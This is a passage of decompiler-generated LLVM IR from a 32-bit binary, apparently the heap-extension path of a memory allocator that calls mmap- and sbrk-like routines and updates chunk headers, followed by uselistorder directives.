  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp91 = icmp ult i32 %v3_804bbf0, 1048576
  %v5_804bbf0 = select i1 %tmp91, i32 1048576, i32 %v3_804bbf0
  store i32 %v5_804bbf0, i32* @esi, align 4
  %tmp132 = icmp ugt i32 %v5_804bbf0, %v1_804bac4
  br i1 %tmp132, label %dec_label_pc_804bbfd, label %dec_label_pc_804be42

dec_label_pc_804bbfd:                             ; preds = %dec_label_pc_804bbe5
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804bc0a = call i32 @function_804cad4(i32 0, i32 %v5_804bbf0, i32 3, i32 34, i32 0, i32 0, i32 %v0_804bbfd, i32 %v0_804bbfd)
  store i32 %v8_804bc0a, i32* %eax.global-to-local, align 4
  %v10_804bc12 = icmp eq i32 %v8_804bc0a, -1
  store i32 %v8_804bc0a, i32* @ebx, align 4
  br i1 %v10_804bc12, label %dec_label_pc_804be42, label %dec_label_pc_804bc27.thread

dec_label_pc_804bc27.thread:                      ; preds = %dec_label_pc_804bbfd
  %v0_804bc1d = load i8, i8* @global_var_804fac0.95, align 1
  %v2_804bc1d = and i8 %v0_804bc1d, -2
  store i8 %v2_804bc1d, i8* @global_var_804fac0.95, align 64
  %v1_804bc24 = load i32, i32* @esi, align 4
  %v2_804bc24 = add i32 %v1_804bc24, %v8_804bc0a
  store i32 %v2_804bc24, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bc30

dec_label_pc_804bc27.dec_label_pc_804bc30_crit_edge: ; preds = %dec_label_pc_804bbba
  %v1_804bc34.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bc30

dec_label_pc_804bc30:                             ; preds = %dec_label_pc_804bc27.dec_label_pc_804bc30_crit_edge, %dec_label_pc_804bc27.thread
  %v1_804bc34 = phi i32 [ %v1_804bc24, %dec_label_pc_804bc27.thread ], [ %v1_804bc34.pre, %dec_label_pc_804bc27.dec_label_pc_804bc30_crit_edge ]
  %v0_804bcfc96 = phi i32 [ %v8_804bc0a, %dec_label_pc_804bc27.thread ], [ %v1_804bbbe, %dec_label_pc_804bc27.dec_label_pc_804bc30_crit_edge ]
  %v0_804bcee95 = phi i32 [ %v2_804bc24, %dec_label_pc_804bc27.thread ], [ -1, %dec_label_pc_804bc27.dec_label_pc_804bc30_crit_edge ]
  %v0_804bc34 = load i32, i32* @global_var_804fac8.92, align 8
  %v2_804bc34 = add i32 %v1_804bc34, %v0_804bc34
  store i32 %v2_804bc34, i32* @global_var_804fac8.92, align 8
  %v2_804bc3a = add i32 %v1_804bb8c, %v0_804bb7c
  store i32 %v2_804bc3a, i32* %ecx.global-to-local, align 4
  %v2_804bc3c = sub i32 %v0_804bcfc96, %v2_804bc3a
  %v7_804bc3c = icmp ult i32 %v0_804bcfc96, %v2_804bc3a
  %v12_804bc3c = icmp eq i32 %v2_804bc3c, 0
  %v1_804bc3e = icmp eq i1 %v12_804bc3c, false
  br i1 %v1_804bc3e, label %dec_label_pc_804bc57, label %dec_label_pc_804bc40

dec_label_pc_804bc40:                             ; preds = %dec_label_pc_804bc30
  %v10_804bc40 = icmp eq i32 %v0_804bcee95, -1
  %v1_804bc43 = icmp eq i1 %v10_804bc40, false
  br i1 %v1_804bc43, label %dec_label_pc_804bc57, label %dec_label_pc_804bc45

dec_label_pc_804bc45:                             ; preds = %dec_label_pc_804bc40
  store i32 %v0_804bb7c, i32* %ecx.global-to-local, align 4
  %v2_804bc49 = add i32 %v1_804bc34, %v1_804bb8c
  %v1_804bc4c = or i32 %v2_804bc49, 1
  store i32 %v1_804bc4c, i32* %eax.global-to-local, align 4
  store i32 %v1_804bc4c, i32* %v2_804bb85, align 4
  br label %dec_label_pc_804bd84

dec_label_pc_804bc57:                             ; preds = %dec_label_pc_804bc40, %dec_label_pc_804bc30
  %v0_804bc57 = load i8, i8* @global_var_804fac0.95, align 1
  %v1_804bc57 = sext i8 %v0_804bc57 to i32
  store i32 %v1_804bc57, i32* %eax.global-to-local, align 4
  %v2_804bc5c = urem i8 %v0_804bc57, 2
  %v3_804bc5c = icmp eq i8 %v2_804bc5c, 0
  br i1 %v3_804bc5c, label %dec_label_pc_804bc70, label %dec_label_pc_804bc60

dec_label_pc_804bc60:                             ; preds = %dec_label_pc_804bc57
  br i1 %v2_804bb8c, label %dec_label_pc_804bc70, label %dec_label_pc_804bc64

dec_label_pc_804bc64:                             ; preds = %dec_label_pc_804bc60
  %v1_804bc66 = icmp eq i1 %v7_804bc3c, false
  br i1 %v1_804bc66, label %dec_label_pc_804bc70, label %dec_label_pc_804bc68

dec_label_pc_804bc68:                             ; preds = %dec_label_pc_804bc64
  %v1_804bc68 = and i32 %v1_804bc57, -2
  %v4_804bc68 = trunc i32 %v1_804bc68 to i8
  store i32 %v1_804bc68, i32* %eax.global-to-local, align 4
  store i8 %v4_804bc68, i8* @global_var_804fac0.95, align 64
  br label %dec_label_pc_804bc70

dec_label_pc_804bc70:                             ; preds = %dec_label_pc_804bc64, %dec_label_pc_804bc60, %dec_label_pc_804bc57, %dec_label_pc_804bc68
  %v0_804bc70 = phi i8 [ %v0_804bc57, %dec_label_pc_804bc64 ], [ %v0_804bc57, %dec_label_pc_804bc60 ], [ %v0_804bc57, %dec_label_pc_804bc57 ], [ %v4_804bc68, %dec_label_pc_804bc68 ]
  %v1_804bc70 = urem i8 %v0_804bc70, 2
  %v2_804bc70 = icmp eq i8 %v1_804bc70, 0
  br i1 %v2_804bc70, label %dec_label_pc_804bcee, label %dec_label_pc_804bc79

dec_label_pc_804bc79:                             ; preds = %dec_label_pc_804bc70
  br i1 %v2_804bb8c, label %dec_label_pc_804bc87, label %dec_label_pc_804bc7d

dec_label_pc_804bc7d:                             ; preds = %dec_label_pc_804bc79
  store i32 %v2_804bc3c, i32* %eax.global-to-local, align 4
  %v2_804bc81 = add i32 %v2_804bc34, %v2_804bc3c
  store i32 %v2_804bc81, i32* @global_var_804fac8.92, align 8
  br label %dec_label_pc_804bc87

dec_label_pc_804bc87:                             ; preds = %dec_label_pc_804bc79, %dec_label_pc_804bc7d
  %v1_804bc89 = urem i32 %v0_804bcfc96, 8
  %v2_804bc89 = icmp eq i32 %v1_804bc89, 0
  store i32 %v1_804bc89, i32* %edx.global-to-local, align 4
  %v1_804bc8c = icmp eq i1 %v2_804bc89, false
  br i1 %v1_804bc8c, label %dec_label_pc_804bc94, label %dec_label_pc_804bc8e

dec_label_pc_804bc8e:                             ; preds = %dec_label_pc_804bc87
  store i32 %v0_804bcfc96, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc9e

dec_label_pc_804bc94:                             ; preds = %dec_label_pc_804bc87
  %v2_804bc99 = sub nsw i32 8, %v1_804bc89
  store i32 %v2_804bc99, i32* %eax.global-to-local, align 4
  %v2_804bc9b = add i32 %v2_804bc99, %v0_804bcfc96
  store i32 %v2_804bc9b, i32* @edi, align 4
  br label %dec_label_pc_804bc9e

dec_label_pc_804bc9e:                             ; preds = %dec_label_pc_804bc8e, %dec_label_pc_804bc94
  %v0_804bcab = phi i32 [ 0, %dec_label_pc_804bc8e ], [ %v2_804bc99, %dec_label_pc_804bc94 ]
  %v2_804bc9e = add i32 %v1_804bc34, %v0_804bcfc96
  %v2_804bcab = add i32 %v0_804bcab, %v1_804bb8c
  store i32 %v2_804bcab, i32* %ecx.global-to-local, align 4
  %v2_804bcae = add i32 %v2_804bcab, %v2_804bc9e
  store i32 %v2_804bcae, i32* %edx.global-to-local, align 4
  %v2_804bcb0 = add i32 %v2_804bcae, %v1_804ba9e
  %v5_804bcb3 = and i32 %v2_804bcb0, %v1_804bbae
  %v2_804bcba = sub i32 %v5_804bcb3, %v2_804bcae
  store i32 %v2_804bcba, i32* %eax.global-to-local, align 4
  %v2_804bcbc = add i32 %v2_804bcba, %v2_804bcab
  store i32 %v2_804bcbc, i32* @esi, align 4
  store i32 %v2_804bcbc, i32* %stack_var_-92, align 4
  %v1_804bcc0 = call i32 @function_804cee4(i32 %v2_804bcbc)
  store i32 %v1_804bcc0, i32* %eax.global-to-local, align 4
  %v10_804bcc8 = icmp eq i32 %v1_804bcc0, -1
  store i32 %v1_804bcc0, i32* %edx.global-to-local, align 4
  %v1_804bccd = icmp eq i1 %v10_804bcc8, false
  br i1 %v1_804bccd, label %dec_label_pc_804bcdd, label %dec_label_pc_804bccf

dec_label_pc_804bccf:                             ; preds = %dec_label_pc_804bc9e
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804bcd4 = call i32 @function_804cee4(i32 0)
  store i32 %v1_804bcd4, i32* %eax.global-to-local, align 4
  store i32 %v1_804bcd4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bd11

dec_label_pc_804bcdd:                             ; preds = %dec_label_pc_804bc9e
  %v1_804bcdd = load i32, i32* @ebx, align 4
  %v7_804bcdd = icmp ult i32 %v1_804bcc0, %v1_804bcdd
  %v1_804bcdf = icmp eq i1 %v7_804bcdd, false
  br i1 %v1_804bcdf, label %dec_label_pc_804bd16, label %dec_label_pc_804bce1

dec_label_pc_804bce1:                             ; preds = %dec_label_pc_804bcdd
  %v0_804bce1 = load i8, i8* @global_var_804fac0.95, align 1
  %v2_804bce1 = and i8 %v0_804bce1, -2
  store i8 %v2_804bce1, i8* @global_var_804fac0.95, align 64
  store i32 %v2_804bc9e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bcf5

dec_label_pc_804bcee:                             ; preds = %dec_label_pc_804bc70
  %v10_804bcee = icmp eq i32 %v0_804bcee95, -1
  br i1 %v10_804bcee, label %dec_label_pc_804bcf9, label %dec_label_pc_804bcf3

dec_label_pc_804bcf3:                             ; preds = %dec_label_pc_804bcee
  store i32 %v0_804bcfc96, i32* @edi, align 4
  br label %dec_label_pc_804bcf5

dec_label_pc_804bcf5:                             ; preds = %dec_label_pc_804bce1, %dec_label_pc_804bcf3
  %v0_804bd1656 = phi i32 [ %v2_804bc9e, %dec_label_pc_804bce1 ], [ %v0_804bcee95, %dec_label_pc_804bcf3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804bd16

dec_label_pc_804bcf9:                             ; preds = %dec_label_pc_804bcee
  store i32 %v0_804bcfc96, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804bd00 = call i32 @function_804cee4(i32 0)
  store i32 %v1_804bd00, i32* %edx.global-to-local, align 4
  %v1_804bd07 = load i32, i32* @ebx, align 4
  %v2_804bd07 = sub i32 %v1_804bd00, %v1_804bd07
  %v1_804bd09 = load i32, i32* @esi, align 4
  %v2_804bd09 = sub i32 %v2_804bd07, %v1_804bd09
  store i32 %v2_804bd09, i32* %eax.global-to-local, align 4
  %v0_804bd0b = load i32, i32* @global_var_804fac8.92, align 8
  %v2_804bd0b = add i32 %v0_804bd0b, %v2_804bd09
  store i32 %v2_804bd0b, i32* @global_var_804fac8.92, align 8
  br label %dec_label_pc_804bd11

dec_label_pc_804bd11:                             ; preds = %dec_label_pc_804bccf, %dec_label_pc_804bcf9
  %v0_804bd1655 = phi i32 [ %v1_804bcd4, %dec_label_pc_804bccf ], [ %v1_804bd00, %dec_label_pc_804bcf9 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804bd16

dec_label_pc_804bd16:                             ; preds = %dec_label_pc_804bcdd, %dec_label_pc_804bcf5, %dec_label_pc_804bd11
  %v0_804bd1b = phi i32 [ %v1_804bcc0, %dec_label_pc_804bcdd ], [ %v0_804bd1656, %dec_label_pc_804bcf5 ], [ %v0_804bd1655, %dec_label_pc_804bd11 ]
  %v10_804bd16 = icmp eq i32 %v0_804bd1b, -1
  br i1 %v10_804bd16, label %dec_label_pc_804bd84, label %dec_label_pc_804bd1b

dec_label_pc_804bd1b:                             ; preds = %dec_label_pc_804bd16
  %v1_804bd1b = load i32, i32* @edi, align 4
  %v2_804bd1b = sub i32 %v0_804bd1b, %v1_804bd1b
  store i32 %v2_804bd1b, i32* %edx.global-to-local, align 4
  %v1_804bd1d = load i32, i32* @esi, align 4
  %v2_804bd1d = add i32 %v1_804bd1d, %v2_804bd1b
  %v1_804bd20 = or i32 %v2_804bd1d, 1
  store i32 %v1_804bd20, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd1b, i32* @global_var_804f78c.80, align 4
  %v2_804bd29 = add i32 %v1_804bd1b, 4
  %v3_804bd29 = inttoptr i32 %v2_804bd29 to i32*
  store i32 %v1_804bd20, i32* %v3_804bd29, align 4
  %v0_804bd2c = load i32, i32* @global_var_804fac8.92, align 8
  %v1_804bd2c = load i32, i32* @esi, align 4
  %v2_804bd2c = add i32 %v1_804bd2c, %v0_804bd2c
  store i32 %v2_804bd2c, i32* @global_var_804fac8.92, align 8
  br i1 %v2_804bb8c, label %dec_label_pc_804bd84, label %dec_label_pc_804bd36

dec_label_pc_804bd36:                             ; preds = %dec_label_pc_804bd1b
  store i32 %v0_804bb7c, i32* %ecx.global-to-local, align 4
  %v1_804bd3a = add i32 %v1_804bb8c, -12
  %v1_804bd3d = and i32 %v1_804bd3a, -8
  store i32 %v1_804bd3d, i32* %eax.global-to-local, align 4
  %v1_804bd42 = or i32 %v1_804bd3d, 1
  store i32 %v1_804bd42, i32* %edx.global-to-local, align 4
  %v5_804bd45 = icmp ult i32 %v1_804bd3d, 15
  store i32 %v1_804bd42, i32* %v2_804bb85, align 4
  %v0_804bd4b = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bd4b = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd4b = add i32 %v0_804bd4b, 4
  %v3_804bd4b = add i32 %v2_804bd4b, %v1_804bd4b
  %v4_804bd4b = inttoptr i32 %v3_804bd4b to i32*
  store i32 5, i32* %v4_804bd4b, align 4
  %v0_804bd53 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bd53 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd53 = add i32 %v0_804bd53, 8
  %v3_804bd53 = add i32 %v2_804bd53, %v1_804bd53
  %v4_804bd53 = inttoptr i32 %v3_804bd53 to i32*
  store i32 5, i32* %v4_804bd53, align 4
  br i1 %v5_804bd45, label %dec_label_pc_804bd84, label %dec_label_pc_804bd5d

dec_label_pc_804bd5d:                             ; preds = %dec_label_pc_804bd36
  %v0_804bd5d = load i32, i32* @global_var_804faa4.96, align 4
  store i32 %v0_804bd5d, i32* @ebx, align 4
  %v0_804bd63 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bd68 = add i32 %v0_804bd63, 8
  store i32 %v1_804bd68, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd68, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_804faa4.96, align 4
  %v1_804bd76 = call i32 @function_804c193(i32 %v1_804bd68)
  store i32 %v1_804bd76, i32* %eax.global-to-local, align 4
  %v0_804bd7e = load i32, i32* @ebx, align 4
  store i32 %v0_804bd7e, i32* @global_var_804faa4.96, align 4
  br label %dec_label_pc_804bd84

dec_label_pc_804bd84:                             ; preds = %dec_label_pc_804bd16, %dec_label_pc_804bd36, %dec_label_pc_804bd1b, %dec_label_pc_804bc45, %dec_label_pc_804bd5d
  %v0_804bd84 = load i32, i32* @global_var_804fac8.92, align 8
  %v0_804bd89 = load i32, i32* @global_var_804facc.97, align 4
  %v0_804bd95 = load i32, i32* @global_var_804f78c.80, align 4
  store i32 %v0_804bd95, i32* @ebx, align 4
  %tmp92 = icmp ule i32 %v0_804bd84, %v0_804bd89
  %v5_804bd9b = select i1 %tmp92, i32 %v0_804bd89, i32 %v0_804bd84
  store i32 %v5_804bd9b, i32* @edx, align 4
  %v1_804bd9e = load i32, i32* @global_var_804fac4.91, align 4
  %v2_804bd9e = add i32 %v1_804bd9e, %v0_804bd84
  store i32 %v5_804bd9b, i32* @global_var_804facc.97, align 4
  %v1_804bdaa = load i32, i32* @global_var_804fad4.93, align 4
  %tmp93 = icmp ule i32 %v2_804bd9e, %v1_804bdaa
  %v5_804bdb0 = select i1 %tmp93, i32 %v1_804bdaa, i32 %v2_804bd9e
  store i32 %v5_804bdb0, i32* %eax.global-to-local, align 4
  store i32 %v5_804bdb0, i32* @global_var_804fad4.93, align 4
  %v1_804bdbc = add i32 %v0_804bd95, 4
  %v2_804bdbc = inttoptr i32 %v1_804bdbc to i32*
  %v3_804bdbc = load i32, i32* %v2_804bdbc, align 4
  %v1_804bdbf = and i32 %v3_804bdbc, -4
  store i32 %v1_804bdbf, i32* @ecx, align 4
  %v10_804bdc2 = icmp ult i32 %v1_804bdbf, %v1_804ba3c
  br i1 %v10_804bdc2, label %dec_label_pc_804be42, label %dec_label_pc_804bdc8

dec_label_pc_804bdc8:                             ; preds = %dec_label_pc_804bd84
  store i32 %v1_804bac4, i32* %esi.global-to-local, align 4
  %v2_804bdce = sub i32 %v1_804bdbf, %v1_804bac4
  store i32 %v2_804bdce, i32* %ecx.global-to-local, align 4
  %v2_804bdd0 = add i32 %v0_804bd95, %v1_804bac4
  store i32 %v2_804bdd0, i32* @edx, align 4
  %v1_804bdd3 = or i32 %v1_804bac4, 1
  store i32 %v1_804bdd3, i32* %eax.global-to-local, align 4
  store i32 %v2_804bdd0, i32* @global_var_804f78c.80, align 4
  store i32 %v1_804bdd3, i32* %v2_804bdbc, align 4
  %v0_804bddf.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804bddf

dec_label_pc_804bddf:                             ; preds = %dec_label_pc_804ba4a, %dec_label_pc_804bdc8
  %v0_804bddf = phi i32 [ %v5_804ba5d, %dec_label_pc_804ba4a ], [ %v0_804bddf.pre, %dec_label_pc_804bdc8 ]
  %v1_804bddf = or i32 %v0_804bddf, 1
  store i32 %v1_804bddf, i32* @ecx, align 4
  %v0_804bde2 = load i32, i32* @ebx, align 4
  %v1_804bde2 = add i32 %v0_804bde2, 8
  store i32 %v1_804bde2, i32* %ebx.global-to-local, align 4
  %v1_804bde5 = load i32, i32* @edx, align 4
  %v2_804bde5 = add i32 %v1_804bde5, 4
  %v3_804bde5 = inttoptr i32 %v2_804bde5 to i32*
  store i32 %v1_804bddf, i32* %v3_804bde5, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804bdea:                             ; preds = %dec_label_pc_804b7fc
  %v5_804bdf0 = sub i32 %v1_804b7df, %v1_804bac4
  store i32 %v5_804bdf0, i32* %eax.global-to-local, align 4
  %v2_804bdf4 = add i32 %v1_804be01, %v1_804bac4
  store i32 %v2_804bdf4, i32* @edx, align 4
  %v1_804bdf8 = or i32 %v1_804bac4, 1
  store i32 %v2_804bdf4, i32* @global_var_804f790.81, align 16
  store i32 %v1_804bdf8, i32* %v2_804b7d9, align 4
  %v0_804be04 = load i32, i32* %eax.global-to-local, align 4
  %v1_804be06 = or i32 %v0_804be04, 1
  store i32 %v1_804be06, i32* @ecx, align 4
  %v0_804be09 = load i32, i32* @edx, align 4
  store i32 %v0_804be09, i32* @global_var_804f79c.98, align 4
  store i32 %v0_804be09, i32* @global_var_804f7a0.83, align 32
  %v1_804be15 = add i32 %v0_804be09, 8
  %v2_804be15 = inttoptr i32 %v1_804be15 to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804be15, align 4
  %v0_804be1c = load i32, i32* @edx, align 4
  %v1_804be1c = add i32 %v0_804be1c, 12
  %v2_804be1c = inttoptr i32 %v1_804be1c to i32*
  store i32 ptrtoint (i32* @global_var_804f794.82 to i32), i32* %v2_804be1c, align 4
  %v0_804be23 = load i32, i32* @ecx, align 4
  %v1_804be23 = load i32, i32* @edx, align 4
  %v2_804be23 = add i32 %v1_804be23, 4
  %v3_804be23 = inttoptr i32 %v2_804be23 to i32*
  store i32 %v0_804be23, i32* %v3_804be23, align 4
  %v0_804be26 = load i32, i32* %eax.global-to-local, align 4
  %v1_804be26 = load i32, i32* @edx, align 4
  %v3_804be26 = add i32 %v1_804be26, %v0_804be26
  %v4_804be26 = inttoptr i32 %v3_804be26 to i32*
  store i32 %v0_804be26, i32* %v4_804be26, align 4
  br label %dec_label_pc_804be34

dec_label_pc_804be2b:                             ; preds = %dec_label_pc_804b80b
  store i32 %v1_804bac4, i32* %ebx.global-to-local, align 4
  %v0_804be2f = load i32, i32* @ebp, align 4
  %v2_804be2f = or i32 %v1_804bac4, 4
  %v3_804be2f = add i32 %v0_804be2f, %v2_804be2f
  %v4_804be2f = inttoptr i32 %v3_804be2f to i32*
  %v5_804be2f = load i32, i32* %v4_804be2f, align 4
  %v6_804be2f = or i32 %v5_804be2f, 1
  store i32 %v6_804be2f, i32* %v4_804be2f, align 4
  br label %dec_label_pc_804be34

dec_label_pc_804be34:                             ; preds = %dec_label_pc_804bdea, %dec_label_pc_804be2b
  %v0_804be34 = load i32, i32* @ebp, align 4
  %v1_804be34 = add i32 %v0_804be34, 8
  store i32 %v1_804be34, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804be39:                             ; preds = %dec_label_pc_804b8fb
  %v1_804be39 = load i32, i32* @ebx, align 4
  %v2_804be39 = add i32 %v0_804b907, 4
  %v3_804be39 = add i32 %v2_804be39, %v1_804be39
  %v4_804be39 = inttoptr i32 %v3_804be39 to i32*
  %v5_804be39 = load i32, i32* %v4_804be39, align 4
  %v6_804be39 = or i32 %v5_804be39, 1
  store i32 %v6_804be39, i32* %v4_804be39, align 4
  br label %dec_label_pc_804be3e

dec_label_pc_804be3e:                             ; preds = %dec_label_pc_804b913, %dec_label_pc_804be39
  %v0_804be3e = load i32, i32* @ecx, align 4
  store i32 %v0_804be3e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804be42:                             ; preds = %dec_label_pc_804bbe5, %dec_label_pc_804bbfd, %dec_label_pc_804bd84
  %v0_804be42 = load i32, i32* %stack_var_-92, align 4
  %v1_804be42 = call i32 @function_804b330(i32 %v0_804be42)
  store i32 %v1_804be42, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804be49 = inttoptr i32 %v1_804be42 to i32*
  store i32 12, i32* %v1_804be49, align 4
  br label %dec_label_pc_804be4f

dec_label_pc_804be4f:                             ; preds = %dec_label_pc_804be3e, %dec_label_pc_804be34, %dec_label_pc_804bddf, %dec_label_pc_804ba75, %dec_label_pc_804ba27, %dec_label_pc_804b7a6, %dec_label_pc_804be42
  store i32 %v2_804b6dd, i32* @eax, align 4
  store i32 %v2_804b6dd, i32* %stack_var_-92, align 4
  %v2_804be58 = call i32 @function_804c7b7(i32 %v2_804b6dd, i32 1)
  store i32 %v2_804be58, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804be60

dec_label_pc_804be60:                             ; preds = %dec_label_pc_804b6fb, %dec_label_pc_804be4f
  %v0_804be63 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804be63, i32* %eax.global-to-local, align 4
  %v2_804be65 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804be65, i32* @ebx, align 4
  store i32 %v0_804b6ca, i32* @esi, align 4
  store i32 %v0_804b6c9, i32* @edi, align 4
  store i32 %v0_804b6c8, i32* @ebp, align 4
  ret i32 %v0_804be63

; uselistorder directives
  uselistorder i32 %v0_804be26, { 1, 0 }
  uselistorder i32 %v1_804bdaa, { 1, 0 }
  uselistorder i32 %v2_804bd9e, { 1, 0 }
  uselistorder i32 %v0_804bd89, { 1, 0 }
  uselistorder i32 %v0_804bd84, { 0, 2, 1 }
  uselistorder i32 %v1_804bd1b, { 1, 0, 2 }
  uselistorder i32 %v0_804bd1b, { 1, 0 }
  uselistorder i32 %v2_804bd09, { 1, 0 }
  uselistorder i32 %v1_804bcc0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_804bcae, { 1, 0, 2 }
  uselistorder i32 %v2_804bc9e, { 1, 2, 0 }
  uselistorder i32 %v2_804bc99, { 1, 0, 2 }
  uselistorder i32 %v1_804bc89, { 2, 1, 0 }
  uselistorder i8 %v0_804bc57, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804bc3a, { 1, 0, 2 }
  uselistorder i32 %v0_804bcee95, { 2, 0, 1 }
  uselistorder i32 %v0_804bcfc96, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804bc34, { 2, 1, 0 }
  uselistorder i32 %v8_804bc0a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_804bbf0, { 1, 0, 2 }
  uselistorder i32 %v3_804bbf0, { 1, 0 }
  uselistorder i32 %v1_804bbbe, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804bbb2, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804bbae, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804bb9c, { 1, 0 }
  uselistorder i1 %v2_804bb8c, { 2, 1, 0 }
  uselistorder i32 %v1_804bb8c, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_804bb7c, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_804bb65, { 1, 0 }
  uselistorder i32 %v2_804bb59, { 1, 0 }
  uselistorder i32 %v2_804bb49, { 0, 3, 1, 2 }
  uselistorder i32 %v2_804bb2d, { 1, 2, 0 }
  uselistorder i32 %v1_804bb2d, { 1, 0, 2 }
  uselistorder i32 %v1_804bb2c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_804bb26, { 1, 0 }
  uselistorder i32 %v2_804bb04, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804baf8, { 2, 1, 0 }
  uselistorder i32 %v8_804bae3, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32 %v2_804baca, { 1, 0, 2 }
  uselistorder i32 %v0_804ba6d, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804ba3c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804ba2f, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804ba15, { 1, 0, 2 }
  uselistorder i32 %v1_804b9af, { 1, 0 }
  uselistorder i32 %v3_804b9a4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_804b99e, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804b99b7, { 1, 0 }
  uselistorder i32 %v2_804b990, { 1, 0 }
  uselistorder i32 %v1_804b974, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804b970, { 2, 1, 0 }
  uselistorder i32 %v1_804b96c, { 1, 0 }
  uselistorder i32 %v1_804b967, { 2, 1, 0 }
  uselistorder i32 %v2_804b956, { 1, 0 }
  uselistorder i32 %v1_804b953, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804b8f1, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804b93c, { 1, 0 }
  uselistorder i32 %v0_804b907, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804b8dd, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804b8aa, { 0, 2, 1 }
  uselistorder i32 %v2_804b88e, { 1, 0 }
  uselistorder i32 %v1_804b884, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804b87f.lcssa, { 1, 0 }
  uselistorder i32 %v3_804b86f, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804b866, { 1, 0, 2 }
  uselistorder i32 %v3_804b849, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v2_804b842, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804b82a, { 2, 1, 0 }
  uselistorder i32 %v0_804b816, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804b7dc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804be01, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804b8aa9, { 1, 0, 2 }
  uselistorder i32 %v3_804b789, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804b77b, { 2, 1, 0 }
  uselistorder i32 %v2_804b756, { 2, 1, 0 }
  uselistorder i8 %v0_804b724, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804bac4, { 13, 32, 12, 2, 30, 11, 3, 23, 22, 10, 9, 4, 25, 24, 21, 19, 20, 5, 27, 26, 28, 6, 29, 16, 7, 17, 18, 8, 31, 14, 15, 0, 33, 35, 34, 1, 36 }
  uselistorder i32 %v1_804b70d, { 0, 2, 1 }
  uselistorder i32 %v0_804b6f6, { 1, 0 }
  uselistorder i32 %v2_804b6dd, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 19, 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 23, 1, 2, 3, 4, 24, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22 }
